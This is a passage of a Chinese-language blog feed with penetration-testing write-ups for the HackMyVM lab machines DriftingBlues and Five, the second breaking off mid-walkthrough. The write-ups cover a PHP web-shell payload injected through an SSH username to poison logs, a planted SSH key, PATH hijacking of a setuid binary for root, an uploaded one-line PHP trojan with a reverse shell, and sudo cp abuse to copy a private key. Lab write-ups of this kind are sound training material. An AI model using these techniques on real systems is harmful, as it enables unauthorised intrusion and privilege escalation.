<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">msf6 <span class="title function_ invoke__">auxiliary</span>(scanner/ssh/ssh_login) &gt; set rhost <span class="number">192.168</span>.<span class="number">80.81</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span>.<span class="number">80.81</span></span><br><span class="line">msf6 <span class="title function_ invoke__">auxiliary</span>(scanner/ssh/ssh_login) &gt; set rport <span class="number">22</span></span><br><span class="line">rport =&gt; <span class="number">22</span></span><br><span class="line">msf6 <span class="title function_ invoke__">auxiliary</span>(scanner/ssh/ssh_login) &gt; set username <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">username =&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);<span class="meta">?&gt;</span></span><br><span class="line">msf6 <span class="title function_ invoke__">auxiliary</span>(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">80.81</span>:<span class="number">22</span> - Starting bruteforce</span><br><span class="line">[*] Scanned <span class="number">1</span> of <span class="number">1</span> <span class="title function_ invoke__">hosts</span> (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå°±å¯ä»¥åå¼¹shelläº† </p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æœ‰ä¸¤ä¸ªç”¨æˆ·lost+foundå’Œrobertj  ç¬¬ä¸€ä¸ªç”¨æˆ·çš„æ–‡ä»¶å¤¹æ— æ³•è¿›å…¥<br>çœ‹robertjçš„æ–‡ä»¶å¤¹å‘ç°.sshæ–‡ä»¶å¯ä»¥å†™å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">www-data@driftingblues:/home/robertj$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>robertj robertj<span class="number"> 4096 </span>Jan <span class="number"> 7 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 4 </span>root    root   <span class="number"> 4096 </span>Jan <span class="number"> 4 </span><span class="number"> 2021 </span>..</span><br><span class="line">drwx---rwx<span class="number"> 2 </span>robertj robertj<span class="number"> 4096 </span>Jan <span class="number"> 4 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-r-x------<span class="number"> 1 </span>robertj robertj  <span class="number"> 33 </span>Jan <span class="number"> 7 </span><span class="number"> 2021 </span>user.txt</span><br></pre></td></tr></table></figure></div>
<p>é‚£å°±æŠŠå…¬é’¥å†™åˆ°authorized_keysé‡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@driftingblues</span><span class="symbol">:/home/robertj/</span>.ssh<span class="variable">$ </span>cat authorized_key </span><br><span class="line">ssh-rsa <span class="title class_">AAAAB3NzaC1yc2EAAAADAQABAAACAQCxliao26atOJyX3C9UgtIxt3RY9S4n921sYgmAxhw5sB58FESP8E</span>+kWMC4QbT23azUa8zVr76QNhru+<span class="title class_">LVFTrW5R9SyxDDYQWjfRwDBiSe2X5MNiqoQU4tiW71DGYiO9M0xQNVx5Auvx6Ip6</span>+kJqEpnXoU0Gw4zRxB3HjeEwYIly8HFATKaOP3Gh7rhwOXJ8gjcF7d6NcnsNbnOeUEArJjDhsax72TIiBYmza0PTg+<span class="number">8</span>YZrjwvDqdZ+swMq5R9SPsn4sLyF5R82wjAajO4ce8qwcIanBxw5KeBfiChtilCaYb0JXH2bNlyQwedGjL2ARtnjgPhIKU/<span class="number">3</span>N42trAcEXDwBCxkLRRGVkgrFDdYN70kcgfo2+<span class="number">7</span>A7hBk2H7EFfY44bGcD9+<span class="title class_">YDsEqVS38VfxcDHNfM5V1ypS</span>+<span class="title class_">ZirpY</span>/<span class="title class_">RXK</span>+<span class="number">46</span>nHfAaieMuhNffS/zegzQEUTR1iHXWvDFOlwS7w3SNiBh4p69NyefputLJEdBhWUrIbsqvIOOzVNC03f7hd0Yq0gsZbvt7g10X4k18Wf7aI/<span class="number">3</span>qg26Yw+<span class="title class_">LJ9zq1VBSKaon0fTYtxrDGyn3qGeT1dKUyFQzbKkKN19X6VYjlSWzFvEft7lgLixwZnsQabUR8XT0UIwfJbN7FU9j</span>+hQos8PBWXsqZIX1q+by5prOChPXMP9phGofL8q+<span class="title class_">SrrKdPUZDMxV8Hbw</span>== root<span class="variable">@kakeru</span></span><br><span class="line">www-data<span class="variable">@driftingblues</span><span class="symbol">:/home/robertj/</span>.ssh<span class="variable">$ </span>mv authorized_key authorized_keys </span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh robertj@192.168.80.81       </span></span><br><span class="line">Linux driftingblues <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">13</span>-amd64 <span class="comment">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Wed Mar <span class="number">19</span> <span class="number">10</span>:<span class="number">28</span>:<span class="number">05</span> <span class="number">2025</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">80.12</span></span><br><span class="line">robertj@driftingblues:~$ </span><br></pre></td></tr></table></figure></div>
<p>ä¸Šä¼ linpeas.sh æ‰«ä¸€ä¸‹å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶æœ‰ä¸€ä¸ªsgid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">[+] SGID</span><br><span class="line">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#sudo-and-suid</span></span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root mail       19K Dec <span class="number"> 3 </span><span class="number"> 2017 </span>/usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty        15K May <span class="number"> 4 </span><span class="number"> 2018 </span>/usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow     31K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/expiry</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow     71K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/chage</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty        35K Jan<span class="number"> 10 </span><span class="number"> 2019 </span>/usr/bin/wall</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow     39K Feb<span class="number"> 14 </span><span class="number"> 2019 </span>/usr/sbin/unix_chkpwd</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root crontab    43K Oct<span class="number"> 11 </span><span class="number"> 2019 </span>/usr/bin/crontab</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root ssh       315K Jan<span class="number"> 31 </span><span class="number"> 2020 </span>/usr/bin/ssh-agent</span><br><span class="line">-r-sr-s---<span class="number"> 1 </span>root operators  17K Jan <span class="number"> 4 </span><span class="number"> 2021 </span>/usr/bin/getinfo</span><br><span class="line"></span><br><span class="line">robertj@driftingblues:/tmp$ id</span><br><span class="line">uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·å°±æ˜¯operatorsè¿™ä¸ªç»„çš„ï¼Œæ‹¿åˆ°æœ¬åœ°å»idaé‡Œé¢çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="WREN"><figure class="iseeu highlight /wren"><table><tr><td class="code"><pre><span class="line">int <span class="variable">__cdecl</span> <span class="title function_">main</span>(<span class="params">int</span> <span class="params">argc</span>, <span class="params">const</span> <span class="params">char</span> **<span class="params">argv</span>, <span class="params">const</span> <span class="params">char</span> **<span class="params">envp</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="title function_">setuid</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_">puts</span>(<span class="string">&quot;###################<span class="char escape_">\n</span>ip address<span class="char escape_">\n</span>###################<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">  <span class="title function_">system</span>(<span class="string">&quot;ip a&quot;</span>);</span><br><span class="line">  <span class="title function_">puts</span>(<span class="string">&quot;###################<span class="char escape_">\n</span>hosts<span class="char escape_">\n</span>###################<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">  <span class="title function_">system</span>(<span class="string">&quot;cat /etc/hosts&quot;</span>);</span><br><span class="line">  <span class="title function_">puts</span>(<span class="string">&quot;###################<span class="char escape_">\n</span>os info<span class="char escape_">\n</span>###################<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">  <span class="title function_">system</span>(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ä¼šæ‰§è¡Œä¸‰ä¸ªå‘½ä»¤ ip a cat &#x2F;etc&#x2F;hosts username -a ç”±äºè¿™ä¸ªé—®ä»·æœ‰sgid æ‰€ä»¥æˆ‘ä»¬ç”¨ç¯å¢ƒåŠ«æŒçš„åšæ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">robertj@driftingblues:/tmp$ <span class="keyword">export</span> PATH=$PWD:$PATH</span><br><span class="line">robertj@driftingblues:/tmp$ which ip</span><br><span class="line">/tmp/ip</span><br><span class="line">robertj@driftingblues:/tmp$ /usr/bin/getinfo</span><br><span class="line">###################</span><br><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>	localhost</span><br><span class="line"><span class="number">127.0</span><span class="number">.1</span><span class="number">.1</span>	driftingblues</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line">###################</span><br><span class="line">os info</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">Linux driftingblues <span class="number">4.19</span><span class="number">.0</span><span class="number">-13</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span><span class="number">.160</span><span class="number">-2</span> (<span class="number">2020</span><span class="number">-11</span><span class="number">-28</span>) x86_64 GNU/Linux</span><br><span class="line">robertj@driftingblues:/tmp$ bash -p</span><br><span class="line">bash<span class="number">-5.0</span># id</span><br><span class="line">uid=<span class="number">1000</span>(robertj) gid=<span class="number">1000</span>(robertj) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1000</span>(robertj),<span class="number">1001</span>(operators)</span><br></pre></td></tr></table></figure></div>
<p>pwned!</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>å­¦åˆ°sshæ—¥å¿—æ³¨å…¥ï¼Œå…¶ä»–çš„æ—¥å¿—æ³¨å…¥ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ï¼Œè¿™é‡Œç”¨ç”¨æˆ·åä½œä¸ºæ³¨å…¥ç‚¹</li>
<li>phpæ–‡ä»¶é™¤äº†åé—¨è¿˜è¦å¤šæƒ³æƒ³èƒ½ä¸èƒ½æ’å…¥ä»£ç </li>
<li>ææƒéƒ¨åˆ†chmod +x &#x2F;bin&#x2F;bash  bash -p ç”¨äº†ç¯å¢ƒå˜é‡æŠŠæ‰§è¡Œçš„å‘½ä»¤å˜æˆå½“å‰ç›®å½•ä¸‹é¢çš„å‘½ä»¤</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Five</title>
    <url>/posts/48411.html</url>
    <content><![CDATA[<p>HMV-Fiveé¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67b3f3a0d0e0a243d4005f94.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.112.17  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">18</span> <span class="number">10</span>:<span class="number">47</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/admin</span></span><br><span class="line">|<span class="params">_http-title:</span> <span class="number">403</span> Forbidden</span><br><span class="line">MAC <span class="params">Address:</span> B6:<span class="number">07</span>:F9:<span class="number">39</span>:F0:<span class="number">32</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.39</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">7.94</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>åªæœ‰80ç«¯å£ï¼Œè€Œä¸”nmapæ‰«å‡ºæ¥äº†&#x2F;adminè·¯å¾„é‚£å°±ç›´æ¥è¿›å…¥webéƒ¨åˆ†</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>ç›´æ¥curlä¸€ä¸‹å‘ç°403äº†ï¼ŒçŒœæµ‹å¯èƒ½è¦æ”¹hostï¼Œå»æµè§ˆå™¨é‡Œé¢è®¿é—®çœ‹çœ‹<br><img src="https://pic1.imgdb.cn/item/67b3f5b1d0e0a243d4006035.png"><br>è¿˜çœŸçš„å°±æ˜¯403ï¼ŒåŸŸåè¿™è¾¹ä¹Ÿæ²¡æœ‰å˜åŒ–ï¼Œé‚£å°±å»&#x2F;adminé‡Œé¢çœ‹<br>å‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œç™»å½•é”™è¯¯æœ‰å›æ˜¾ï¼Œé‚£å°±å…ˆç”¨bpçˆ†ç ´ä¸€ä¸‹<br>ç”¨æˆ·åç”¨adminçˆ†ç ´äº†ä¸€ä¸‹å¯†ç ï¼Œæ²¡æœ‰çˆ†ç ´å‡ºæ¥<br>ç”¨gobusteræ‰«ä¸€ä¸‹ç›®å½•å§</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u http://192.168.112.17/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,jpg,webg,png,js,txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.112.17/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,html,jpg,webg,png,js,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/uploads              (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/uploads/]</span><br><span class="line">/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/admin/]</span><br><span class="line">/upload.html          (Status: 200) [Size: 346]</span><br><span class="line">/upload.php           (Status: 200) [Size: 48]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 17]</span><br><span class="line">Progress: 743223 / 1661152 (44.74%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 744172 / 1661152 (44.80%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="code">                                                                     </span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªupload.htmlç•Œé¢å¯ä»¥ä¸Šä¼ æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67b3f719d0e0a243d4006095.png"><br>ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬1.phpï¼ŒæˆåŠŸä¸Šä¼ ï¼Œè€Œä¸”è·³è½¬åˆ°upload.phpè¿™é‡Œ<br><img src="https://pic1.imgdb.cn/item/67b3f753d0e0a243d40060ab.png"><br>ç°åœ¨çš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°ä¸Šä¼ çš„ä½ç½®ï¼Œç„¶åç”¨èšå‰‘è¿æ¥äº†ã€‚<br>æŠ“åŒ…ç”¨bpæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸Šä¼ åˆ°uploads&#x2F;ç›®å½•ä¸‹é¢ï¼Œä½†æ˜¯è¿™ä¸ªç›®å½•ä¸‹æˆ‘æ— æ³•è®¿é—®<br><img src="https://pic1.imgdb.cn/item/67b3fa31d0e0a243d4006199.png"><br>é‚£å°±æŠŠè¿™ä¸ªè·¯å¾„åˆ é™¤ï¼Œè®©å®ƒä¸Šä¼ åˆ°æ ¹ç›®å½•<br>ç°åœ¨ç”¨èšå‰‘å°±å¯ä»¥æˆåŠŸè¿æ¥äº†ï¼Œé‚£ç°åœ¨å°±è¿›å…¥èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯é‡Œé¢åå¼¹shell<br>å› ä¸ºèšå‰‘çš„è¿™ä¸ªè™šæ‹Ÿç»ˆç«¯ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„ç»ˆç«¯ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨<br><img src="https://pic1.imgdb.cn/item/67b3fb23d0e0a243d40061d8.png"><br>æˆåŠŸæ‹¿åˆ°shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234           </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data@five:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> bbb            </span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? xterm</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="www"><a href="#www" class="headerlink" title="www"></a>www</h2><p>å…ˆå»çœ‹ä¸€ä¸‹wwwç”¨æˆ·çš„sudoæƒé™ï¼Œå‘ç°æœ‰ä¸€ä¸ªç”¨æˆ·çš„cpå‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/var</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (melisa) <span class="symbol">NOPASSWD:</span> /bin/cp</span><br></pre></td></tr></table></figure></div>
<p>å»ç”¨æˆ·çš„ç›®å½•ä¸‹é¢çœ‹ï¼Œå‘ç°æœ‰.sshï¼Œé‚£æˆ‘çš„åŸæ¥ç›®æ ‡å°±æ˜¯å»æ‹¿sshç§é’¥,ä½†æ˜¯è¿™ä¸ªé¶æœºæ²¡æœ‰å¼€æ”¾22ç«¯å£<br>ä½†æ˜¯æˆ‘å»çœ‹å¼€æ”¾äº†ä»€ä¹ˆç«¯å£ï¼Œå‘ç°æœ‰ä¸€ä¸ª4444ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/home/melisa$ ss -tulnp</span><br><span class="line"><span class="attribute">Netid</span>       State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port                                             </span><br><span class="line"><span class="attribute">udp</span>         UNCONN       <span class="number">0</span>            <span class="number">0</span>                        <span class="number">0.0.0.0:68</span>                      <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                      <span class="number">0.0.0.0:80</span>                      <span class="number">0.0.0.0</span>:*           users:((<span class="string">&quot;nginx&quot;</span>,pid=<span class="number">384</span>,fd=<span class="number">6</span>))       </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                    <span class="number">127.0.0.1:4444</span>                    <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                        <span class="meta"> [::]:80                         [::]:*           users:((&quot;nginx&quot;,pid=384,fd=7))  </span></span><br></pre></td></tr></table></figure></div>
<p>è¯´ä¸å®šå¯è¡Œ<br>å¤åˆ¶ç§é’¥è¿‡æ¥ï¼Œå‘ç°4444ç«¯å£æ˜¯å¯ä»¥ç™»å½•çš„ï¼Œä½†æ˜¯permission denyäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>sudo -u melisa cp /home/melisa/.ssh/id_rsa /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>cd /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">600</span> id_rsa</span><br><span class="line"><span class="symbol">chmod:</span> changing permissions of <span class="string">&#x27;id_rsa&#x27;</span>: <span class="title class_">Operation</span> <span class="keyword">not</span> permitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh melisa<span class="variable">@127</span>.<span class="number">0.0</span>.<span class="number">1</span> -p <span class="number">4444</span> -i id_rsa</span><br><span class="line"><span class="title class_">Could</span> <span class="keyword">not</span> create directory <span class="string">&#x27;/var/www/.ssh&#x27;</span>.</span><br><span class="line"><span class="title class_">The</span> authenticity of host <span class="string">&#x27;[127.0.0.1]:4444 ([127.0.0.1]:4444)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">Load key &quot;id_rsa&quot;: Permission denied</span></span><br></pre></td></tr></table></figure></div>
<p>çœ‹äº†wpçŸ¥é“åŸæ¥æ˜¯æ²¡æœ‰å…¬é’¥,ç”¨<code>ssh-keygen</code>å¯ä»¥ç”Ÿæˆå…¬é’¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh-keygen -y -f id_rsa &gt; authorized_keys</span><br><span class="line"><span class="title class_">Load</span> key <span class="string">&quot;id_rsa&quot;</span>: <span class="title class_">Permission</span> denied</span><br></pre></td></tr></table></figure></div>
